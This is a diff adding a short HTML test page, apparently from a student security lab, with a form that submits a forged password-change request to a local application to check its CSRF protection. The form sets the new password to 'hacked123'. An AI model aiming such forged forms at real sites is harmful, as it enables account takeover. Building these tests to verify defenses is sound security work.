@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head><title>Test CSRF</title></head>
+<body>
+<h1>Test d'attaque CSRF</h1>
+<form action="http://localhost/TP_securiserApp/index.php?page=change_password" method="POST">
+    <input name="current_password" value="SecurePass123!">
+    <input name="new_password" value="hacked123">
+    <input name="confirm_password" value="hacked123">
+    <input type="submit" value="Tenter CSRF">
+</form>
+</body>
+</html>
